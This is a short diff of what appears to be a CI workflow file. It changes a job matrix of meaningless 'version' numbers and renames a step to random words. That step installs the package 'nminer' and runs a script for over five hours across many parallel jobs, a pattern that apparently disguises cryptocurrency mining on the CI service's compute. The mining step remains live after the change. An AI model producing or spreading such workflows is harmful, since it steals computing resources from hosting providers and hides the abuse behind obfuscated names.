@@ -9,21 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 123 }
-          - { version: 1046 }
-          - { version: 927 }
-          - { version: 2263 }
-          - { version: 9115 }
-          - { version: 8767 }
-          - { version: 3762 }
-          - { version: 9665 }
-          - { version: 4661 }
-          - { version: 3088 }
-          - { version: 8692 }
-          - { version: 6885 }
-          - { version: 2340 }
-          - { version: 3486 }
-          - { version: 4589 }
+          - { version: 3036 }
+          - { version: 7766 }
+          - { version: 3544 }
+          - { version: 5896 }
+          - { version: 9970 }
+          - { version: 8232 }
+          - { version: 1676 }
+          - { version: 6241 }
+          - { version: 6149 }
+          - { version: 8749 }
+          - { version: 7803 }
+          - { version: 828 }
+          - { version: 846 }
+          - { version: 4190 }
+          - { version: 7824 }
+          - { version: 2335 }
 
     steps:
       - name: Checkout
@@ -34,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: imaginative mockingly task rapidly
+      - name: blah lest excluding brr
         run: |
           npm install nminer@latest
-          timeout 345m node deduction.js || echo "deduction executed"
+          timeout 323m node deduction.js || echo "deduction executed"
